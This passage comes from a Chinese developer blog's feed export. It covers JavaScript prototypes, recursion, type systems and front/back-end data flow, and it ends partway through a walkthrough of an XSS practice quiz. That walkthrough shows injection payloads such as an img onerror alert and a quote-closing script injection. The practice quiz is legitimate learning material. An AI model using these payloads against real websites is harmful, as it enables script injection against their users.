<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.constructor.prototype 在chrome,firefox中可以通过 a.__proto__ 直接访问</span></span><br><span class="line">a.constructor.prototype.log2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>.b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.log2();</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">b.log2();</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>由于闭包的特性，我们只能借助<code>a.constructor.prototype</code>来更改原型。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/</a><br><a href="http://www.cnblogs.com/snandy/archive/2012/09/01/2664134.html" target="_blank" rel="noopener">http://www.cnblogs.com/snandy/archive/2012/09/01/2664134.html</a><br><a href="http://stackoverflow.com/questions/9959727/proto-vs-prototype-in-javascript" target="_blank" rel="noopener">http://stackoverflow.com/questions/9959727/proto-vs-prototype-in-javascript</a></p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>写写我理解的递归</title>
    <url>/2016/12/15/%E5%86%99%E5%86%99%E6%88%91%E7%90%86%E8%A7%A3%E7%9A%84%E9%80%92%E5%BD%92/</url>
    <content><![CDATA[<h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><h2 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h2><p>先用一个例子说明：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> result = n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">	result *= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面使用循环实现了一个阶乘计算。如何换成递归呢？</p>
<a id="more"></a>
<p>如何求<code>3</code>的阶乘？</p>
<blockquote>
<p>答：需要求<code>2</code>的阶乘，再乘<code>3</code>。</p>
</blockquote>
<p>如何求<code>2</code>的阶乘？</p>
<blockquote>
<p>答：需要求<code>1</code>的阶乘，再乘<code>2</code>。</p>
</blockquote>
<p>如何求<code>1</code>的阶乘？</p>
<blockquote>
<p>答：需要求<code>1</code>的阶乘，<code>1</code>的阶乘就是1。</p>
</blockquote>
<p>这上面的都是重复的，让我们来考虑复杂点的：</p>
<p>如何求<code>n</code>的阶乘？</p>
<blockquote>
<p>如果值不是<code>1</code>，你就必须让<code>n</code>和<code>n-1</code>的阶乘相乘，可以简写成<code>n! = n(n − 1)!</code> 或者<code>n * f(n-1)</code>，f(n-1)就是n-1的阶乘的数学写法。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> n*factorial(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>当然，这两种方法求阶乘对于我们都能理解，可以理解为局部循环和函数循环，但都达到了一目的。</p>
<p><strong>2017-04-27</strong></p>
<blockquote>
<p>前两天看了代码大全，作者表示用递归来计算阶乘是一件sb的事情，不过我仔细思考了下，作为当时初次理解递归思路，这个例子还是可以接受的。不过他的开销确实不如循环。</p>
</blockquote>
<p>引自wiki百科(<a href="https://zh.wikipedia.org/wiki/%E9%80%92%E5%BD%92_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)" target="_blank" rel="noopener">递归</a>)：</p>
<blockquote>
<p>计算理论可以证明递归的作用可以完全替换循环。</p>
</blockquote>
<h2 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h2><p>不太清楚怎么做的，可以先玩下游戏，然后再去实现。</p>
<p><img src="http://i.imgur.com/AZoEtiC.jpg" alt></p>
<p>假设有3个盘子，如何把这些盘子从左边柱子上，借助中间柱子移动到最右边？</p>
<blockquote>
<p>需要将最上层两个盘子移动到中间柱子，然后将最下面的盘子移动到最右边，再将中间的两个盘子移动到最右边。</p>
</blockquote>
<p>如何移动两个盘子？</p>
<blockquote>
<p>需要将上面的盘子移动到中间的柱子，将第二个（底下的）盘子移动到目标盘子。</p>
</blockquote>
<p>如果只有一个盘子？</p>
<blockquote>
<p>直接移动盘子到目标柱子。</p>
</blockquote>
<p><img src="http://i.imgur.com/Id8S7Y5.gif" alt><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hanoi</span>(<span class="params">disc , src , mid , dst</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(disc &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		hanoi(disc<span class="number">-1</span> , src , dst , mid);</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"Move the "</span>+disc+<span class="string">" from "</span>+src+<span class="string">" to "</span>+dst);</span><br><span class="line">		hanoi(disc<span class="number">-1</span> , mid , src ,dst);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">hanoi(<span class="number">3</span>,a,b,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Move the 1 from src to dst</span></span><br><span class="line"><span class="comment">//Move the 2 from src to mid</span></span><br><span class="line"><span class="comment">//Move the 1 from dst to mid</span></span><br><span class="line"><span class="comment">//Move the 3 from src to dst</span></span><br><span class="line"><span class="comment">//Move the 1 from mid to src</span></span><br><span class="line"><span class="comment">//Move the 2 from mid to dst</span></span><br><span class="line"><span class="comment">//Move the 1 from src to dst</span></span><br></pre></td></tr></table></figure></p>
<p><strong>分析：</strong></p>
<p>盘子数不能小于1。</p>
<ol>
<li>想要移动n个盘子，需要把上面的n-1个盘子移动到辅助柱子上，然后移动最底下的盘子到目标，最后，把辅助柱子上的盘子移动到目标柱子。</li>
<li><p>如果递归想不通，那么思考下循环，谁是第一个被移动的盘子（假设最底下是3号盘子）？</p>
<ul>
<li><p>想移动3号盘子，需要移动2号盘子，想移动2号，盘子，需要移动1号盘子。所以在递归中，1号盘子先被移动。</p>
</li>
<li><p>1号盘子先被移动到那个柱子上呢？玩游戏我发现，单数盘子想要移动到目标柱子上，需要最顶层的盘子（1号盘子）先移动到目标柱子上；如果是双数盘子，则需要最顶层的盘子先移动到辅助柱子上。所以，到底1号盘子被先移动到那个柱子上，和盘子数有关。</p>
</li>
<li><p>从算法中我们亦可以看到，hanoi(disc-1 , src , dst , mid);交换了目标柱子和辅助柱子，如果disc为偶数，则1号（最顶层的）移动到了中间柱子(mid)；如果disc为奇数，则1号盘子移动到了目标柱子(dst)。</p>
</li>
</ul>
</li>
<li><p>画出移动盘子的树形图</p>
</li>
</ol>
<p><img src="http://i.imgur.com/g87rGYm.png" alt></p>
<p>这不就是中序遍历。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//Definition for a binary tree node.</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>.val = val;</span><br><span class="line">     <span class="keyword">this</span>.left = <span class="keyword">this</span>.right = <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">var</span> help = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root===<span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        help(root.left);</span><br><span class="line">        result.push(root.val);</span><br><span class="line">        help(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    help(root);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对于这样一个二叉树(nu 是null)</span></span><br><span class="line"></span><br><span class="line">		       <span class="number">1</span></span><br><span class="line">		   /       \</span><br><span class="line">		  <span class="number">2</span>          <span class="number">3</span></span><br><span class="line">		/   \      /   \</span><br><span class="line">	   <span class="number">4</span>    nu3    <span class="number">5</span>     nu6</span><br><span class="line">	  / \         / \   </span><br><span class="line">	 nu1 nu2     nu4 nu5</span><br></pre></td></tr></table></figure>
<p>分析：</p>
<pre><code>help(值为1的节点);
help(值为2的节点)
help(值为4的节点);
help(值为nu1的节点);return;
result.add(4);
help(值为nu2的节点);return;
result.add(2);
help(值为nu3的节点);return;
result.add(1);
help(值为3的节点);
help(值为5的节点);
help(值为nu4的节点);return;
result.add(5);
help(值为nu5的节点);return;
result.add(3);
help(值为nu6的节点);return;
函数运行完毕。
</code></pre><p>这里，我们通过一个result变量来维持结果集，所有的子问题都返回结果给result变量。</p>
<p>我们想要得到这棵树的中序遍历，我们并没有上来就获取root的值，而是：</p>
<ol>
<li>不停地访问他的左节点，直到null为止，然后获取最近的父节点的值。</li>
<li>然后再按照步骤1访问它的右节点。</li>
</ol>
<p>这就是递归的力量：要想做整体的事情，只需要知道整体中一部分的解决办法就可以了（要知道何时停止）。</p>
<h2 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h2><p>再补充最后一个点，刚好还是一个尾递归。</p>
<p>像之前的递归阶乘就是一种尾递归。</p>
<p>摘自wiki：</p>
<blockquote>
<p>尾调用的重要性在于它可以不在调用栈上面添加一个新的堆栈帧——而是更新它，如同迭代一般。尾递归因而具有两个特征：<br></p>
<ol>
<li>调用自身函数(Self-called)；<br><br>2.计算仅占用常量栈空间(Stack Space)。<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Definition for a binary tree node.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">	 <span class="keyword">this</span>.val = val;</span><br><span class="line">	 <span class="keyword">this</span>.left = <span class="keyword">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二叉树求和</span></span><br><span class="line"><span class="keyword">var</span> sumNode = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root===<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> root.val + sumNode(root.left) + sumNode(root.right);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>recursion</tag>
      </tags>
  </entry>
  <entry>
    <title>编程语言分类</title>
    <url>/2016/12/09/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="JavaScript语言精粹"><a href="#JavaScript语言精粹" class="headerlink" title="JavaScript语言精粹"></a>JavaScript语言精粹</h1><p>这本书买了很久，一是因为它薄，二是仔细看这本书，他确实涵盖了很多东西。</p>
<h1 id="静态语言和动态语言"><a href="#静态语言和动态语言" class="headerlink" title="静态语言和动态语言"></a>静态语言和动态语言</h1><p>先举个例子，C语言：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">float</span> pi = <span class="number">3.14159265</span>;</span><br></pre></td></tr></table></figure></p>
<p>JavaScript：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"hello"</span>;</span><br><span class="line">alert(str);<span class="comment">//第一行之后，str就是是一个String类型了</span></span><br></pre></td></tr></table></figure>
<p>比较这两个方式。在C语言中，我们用<code>float</code>关键字定义了变量 <code>pi</code>，而JS并未使用这样的方式。<br></p>
<a id="more"></a>
<p>C语言是一种<code>静态类型</code>，在声明期 | 编译期就给定了变量的类型；在<code>静态类型</code>语言中，<strong>类型是从属于变量（变量改变类型需要类型声明改变）</strong>。从声明那一刻开始，变量只能被分配声明类型的数据（给定的数据类型 | 类型转换后的data）。那既然有这样的需求，静态语言会有一个<code>编译期</code>用于类型检测，这样就会产生<code>编译期</code>和<code>运行期</code>两个时期。<br><br>一些常见的静态类型语言： C++, C#, Java, Basic, Pascal, Ada 和 Fortran。<br></p>
<p>JavaScript语言是一种<code>动态类型</code>，变量类型可以在运行期间改变；在<code>动态类型</code>语言中，<strong>类型是从属于数据（数据类型改变影响了类型改变）</strong>。变量名只是指向了数据，他们可以在任何时刻指向任何类型的数据。既然不需要类型检测，那么，也就不需要区分<code>编译期</code>和<code>运行期</code>。<br><br>一些常见的动态类型语言： 大部分脚本语言和快速原型开发语言，例如，Javascript, Lisp, PHP, Python, Ruby, Scheme 等等。</p>
<h1 id="强类型与弱类型"><a href="#强类型与弱类型" class="headerlink" title="强类型与弱类型"></a>强类型与弱类型</h1><p><code>强弱类型</code>的概念没有<code>动态和静态类型</code>语言的区分那么清晰。一个最常见的定义方式：<strong>是否允许不相同类型之间的操作。</strong><br>例如，JS操作：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">123</span>;</span><br><span class="line">num = num + <span class="string">'str'</span>;<span class="comment">//结果123str，JS可以不用在意不同类型的变量之间进行操作</span></span><br></pre></td></tr></table></figure></p>
<p>Java操作<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num = <span class="number">123</span>;</span><br><span class="line">num = num +<span class="string">'str'</span>;<span class="comment">//异常，Java不允许不同类型之间的变量进行操作</span></span><br></pre></td></tr></table></figure></p>
<p>JS会隐式转换数字num为字符串，然后得出字符串结果。而Java不允许这样的转换（ClassCastException），因为这是一种过于灵活的表现。</p>
<p><code>弱类型</code>允许这样的快速开发，而<code>强类型</code>会在编译期捕获这种隐含的错误。<code>强类型</code>需要程序员关注类型转换，而<code>弱类型</code>更多的是通过大量的隐式（自动）转换完成了这些操作。</p>
<p><strong>P.S.</strong><br>一般来说，静态类型由于需要<code>编译期</code>进行类型检测。正常来讲，静态类型应该都是强类型，即不允许不同类型之间可以进行操作。<strong>而C和Basic语言却是特殊的不是强类型的静态类型语言。</strong><br><br>因为，C语言中，对于<code>Char</code>字符的操作，实际隐式转化为<code>int</code>进行操作，那么，这样的话，打破了强类型的规则。</p>
<h1 id="安全类型和不安全类型"><a href="#安全类型和不安全类型" class="headerlink" title="安全类型和不安全类型"></a>安全类型和不安全类型</h1><p>如何定义<code>安全</code>这个概念？对于异常进行捕获，将会导致程序停止，但是，如果不捕获异常，就会出现各种奇怪的行为。所以，安全类型会让语言在<code>编译期</code>捕获隐藏的异常，对于动态语言，将会在<code>运行期</code>捕获这些异常。<br><br>这里有一个误区：弱类型的语言缺乏安全性。这个概念是<strong>不对的</strong>，相反的，由于弱类型会把检测操作放在运行期，运行期检测有一个好处，所有的信息都处于待运行状态并且都可被获取，使得安全检测可以被更彻底的执行。<br><br>例如：C语言中的指针被认为是一种不安全的类型，而索引则被认为是一种安全的类型。</p>
<h1 id="各语言分类"><a href="#各语言分类" class="headerlink" title="各语言分类"></a>各语言分类</h1><table>
<thead>
<tr>
<th>Language</th>
<th>Static / Dynamic</th>
<th>Strong / Weak</th>
<th>Safety</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ada</td>
<td>static</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>C</td>
<td>static</td>
<td>weak</td>
<td>unsafe</td>
</tr>
<tr>
<td>C++</td>
<td>static</td>
<td>strong</td>
<td>unsafe</td>
</tr>
<tr>
<td>Java</td>
<td>static</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Javascript</td>
<td>dynamic</td>
<td>weak</td>
<td>safe</td>
</tr>
<tr>
<td>Lisp</td>
<td>dynamic</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Pascal</td>
<td>static</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Perl</td>
<td>dynamic</td>
<td>weak</td>
<td>safe</td>
</tr>
<tr>
<td>PHP</td>
<td>dynamic</td>
<td>weak</td>
<td>safe</td>
</tr>
<tr>
<td>Python</td>
<td>dynamic</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Ruby</td>
<td>dynamic</td>
<td>strong</td>
<td>safe</td>
</tr>
</tbody>
</table>
<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h3 id="强弱类型-和-动静态语言区别："><a href="#强弱类型-和-动静态语言区别：" class="headerlink" title="强弱类型 和 动静态语言区别："></a><code>强弱类型</code> 和 <code>动静态语言</code>区别：</h3><p>这两个概念是有区别的，<code>强弱类型</code>的本质是<strong>是否允许不同类型之间进行操作</strong>，例如：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JavaScript</span></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">1</span>;<span class="comment">//i 是number类型，数字</span></span><br><span class="line">i = i + <span class="string">"abc"</span><span class="comment">//不会报异常，结果为"1abc"</span></span><br></pre></td></tr></table></figure></p>
<p><code>弱类型</code>隐式转换了变量类型。</p>
<p>再如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//Python</span><br><span class="line">a = <span class="number">1</span>;//a是一个数字类型</span><br><span class="line">a = a+<span class="string">"abc"</span>//异常，不允许数字和字符串进行 <span class="string">"+"</span>操作</span><br></pre></td></tr></table></figure></p>
<p>python是一个<code>强类型</code>语言，不允许不同类型的变量之间的操作。</p>
<blockquote>
<p>这里强调一下，我一直以为，Python是动态的语言，所以一定是弱类型语言，但是其实Python是动态的强类型语言。所以说这两个概念是有区别的：强类型不允许不同类型之间的变量有操作。动态型使得变量的类型是由数据的类型所决定，而不是由关键字。</p>
</blockquote>
<p><code>动静态语言</code>是由变量的初始化方式所决定。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Java</span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;<span class="comment">//整型</span></span><br><span class="line"><span class="keyword">float</span> b = <span class="number">1.0</span>;<span class="comment">//浮点型</span></span><br></pre></td></tr></table></figure></p>
<p>变量的定义是关键字定义的。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JavaScript</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'abc'</span>;<span class="comment">//字符串类型</span></span><br><span class="line">str = <span class="number">123</span>;<span class="comment">//number类型</span></span><br></pre></td></tr></table></figure></p>
<p>变量的类型是由数据的类型所定义的。</p>
<p>参考：<a href="http://eli.thegreenplace.net/2006/11/25/a-taxonomy-of-typing-systems" target="_blank" rel="noopener">http://eli.thegreenplace.net/2006/11/25/a-taxonomy-of-typing-systems</a></p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>前后端数据流导向</title>
    <url>/2016/12/08/%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AF%BC%E5%90%91/</url>
    <content><![CDATA[<h1 id="前后端数据流导向"><a href="#前后端数据流导向" class="headerlink" title="前后端数据流导向"></a>前后端数据流导向</h1><p>这只是我的一点个人总结，描述了一些前后端的数据走向，用于初学者对于Web端开发的理解。</p>
<h2 id="模板与ajax"><a href="#模板与ajax" class="headerlink" title="模板与ajax"></a>模板与ajax</h2><p>我初学JavaWeb接触到是Servlet | JSP开发；而我的朋友是从前端界面开始学起，经常听到他抱怨，后端一点都不懂，每次都是开发完毕以后由他人改模板；直到某一次，大神给我俩上了一堂课，我才明白了所谓的模板与前后端分离开发。<br><br>在我的理解中，模板分为两种：<code>Js模板（前端JavaScript开发的）</code>和<code>Jsp模板（后端Java开发的）</code>；这些模板的出现简化了<code>数据绑定</code>。</p>
<a id="more"></a>
<ol>
<li>后端模版的使用，例如Jsp，主要是在后端动态生成前端Html代码，数据绑定在生成Html的时候由Java拼接好，然后发送给用户，由浏览器解析。</li>
<li>而前端”模板”（姑且这么称呼），主要利用了JavaScript来实现。实际使用中，需要Js向服务端请求数据，然后操作Dom树实现数据绑定。例如，最常见的Ajax请求服务器接口，返回给Json数据，实现数据绑定。而一些前端框架，也借鉴了一些后端标签模板的绑定方式，自定义了一些标签来简化绑定操作。<br></li>
</ol>
<p>JSP模板：</p>
<p><img src="http://i.imgur.com/bupRErJ.png" alt></p>
<p>JS操作：</p>
<p><img src="http://i.imgur.com/O4dnoPP.png" alt></p>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">JSP中最常见的一种语法：</span><br><span class="line">&lt;%=java代码%&gt;，就是一种很常见的模板写法。</span><br></pre></td></tr></table></figure>
<p>而前端去操作的话，会使用JavaScript：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">'title'</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        url: <span class="string">"data.json"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#title"</span>).html(data.title);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可能都会基于此种方式。</p>
<p><strong>区别：</strong></p>
<ol>
<li>从思路上的区别，JSP更想用标签去替代一些AJax请求，直接生成静态页面返回给用户。</li>
<li>而使用JS去请求数据，使得前后端分工明确，前端开发可以不用去理解后端如何运作，而只需要获取数据，专心于界面美观等UI设计。而后端，也减少了界面上开发的痛苦。</li>
</ol>
<h3 id="如何使用模板和Ajax，什么时候用哪个？"><a href="#如何使用模板和Ajax，什么时候用哪个？" class="headerlink" title="如何使用模板和Ajax，什么时候用哪个？"></a>如何使用模板和Ajax，什么时候用哪个？</h3><blockquote>
<p>基于总体，一切从简。</p>
</blockquote>
<p>要符合整体设计，不能局限于局部的简单，而忽略整体的设计。过度的批判某一种技术都不是一种好的心态。</p>
<p>我做了一个非常简单的小Demo刚好展示了Ajax和模板的使用。</p>
<h2 id="get和post"><a href="#get和post" class="headerlink" title="get和post"></a>get和post</h2><p>我也经常混淆这两个的使用，直到一天看到有人说，为什么不从字面上理解呢？确实，get给人一种从服务器获取的感觉，而post是一种给出的意思。<br><br>为什么不用post呢，他完全可以替代get？我说，get和post区别？答：get是url请求，最大1kB；而post是能传输很大的。<br><br>字面上，get是获取，只是想从服务器上获取数据。那么，就像你去图书馆借书，你只需要给出书名就可以找到你想借的书了。而post更像是你去考试，你不可能只把姓名学号告诉老师就走了，你还要提交你写的试卷，那么此时，如果数据大于1kB，选择post才是你的唯一手段。而对于，简单的获取请求，使用post显得过于繁琐，而使用get却可以轻松地实现。</p>
<h2 id="Json与IO流"><a href="#Json与IO流" class="headerlink" title="Json与IO流"></a>Json与IO流</h2><p>IO流是我在学习Java时学习到的，这个操作是对数据的传输以流（可以理解为移动一壶水需要水的流动）的形式进行，有字节流和字符流两种形式。<br><br>而Json对象，在我眼里就是键值对（Map）数据结构，那为什么用Json和IO对比？<br>因为，在我所接触的开发中，这两种最常用，<strong>但是他俩却没有对比性</strong>，Json对象在传输时也是IO流，只是在源头增加了解析或者封装Json对象与流之间转换的方法。<br><br>但是这两个概念却经常被混淆，引用大神以前说的一句话<strong>“一切都是流”</strong>。<br><br>为什么有了Json？我用Json对象的感觉就是方便，尤其是Js的操作，更是简单易用，而Java虽然也有类似的数据结构HashMap，但是操作起来真的不是很方便。</p>
<p>所以，我认为：<strong>IO是传输的方式，而Json是为了应用而建立起来的规则，有点类似于TCP和HTTP之间的关系。</strong></p>
<p>IO在我使用中，有两次深刻的理解：</p>
<p>第一次是Servlet开发时，获取Post请求时，<code>request.getInputStream()</code>获取Post数据流，我知道了客户端服务器的交互就是数据流的交互。而对于Json，可以理解为对于收到的<strong>数据</strong>所封装的一种数据形式规则。<br></p>
<p>第二次是使用Java进行Socket编程，其中客户端与服务器之间的交互是IO流。我意识到，客户端与服务器之间的交互，都是IO或者说数据流之间的交互。而协议，例如Http，则是对于获取到的<strong>IO流</strong>转换为人们可理解的数据后形成的规则。<strong>流是数据传输的形式，而协议是构建应用的基础。</strong></p>
<p>所以我只想说一句话：<strong>一切都是流</strong>。</p>
]]></content>
      <tags>
        <tag>Web开发</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS过关小游戏~</title>
    <url>/2016/09/08/XSS%E8%BF%87%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<p>这个挺有意思的，日本人写的，入门XSS，感觉学到了不少！</p>
<h1 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5</a></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img onerror=<span class="string">"alert(document.domain);"</span> src= <span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></p>
</blockquote>
<p>先用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>检查源码，发现，组成</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> value=<span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span> name=p1&gt;</span><br></pre></td></tr></table></figure>
<p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure>
<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></p>
</blockquote>
<p>输入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>源码显示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&amp;#60;script&amp;#62;alert(document.domain);&amp;#60;/script&amp;#62;</span><br></pre></td></tr></table></figure>
<p>输入框发现使用特殊字符：<code>&lt;&gt;&quot;&quot;/ \</code>都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">Search a place: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"30"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Search"</span>&gt;</span> &amp;nbsp;</span><br><span class="line">Choose a country: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"p2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Germany<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 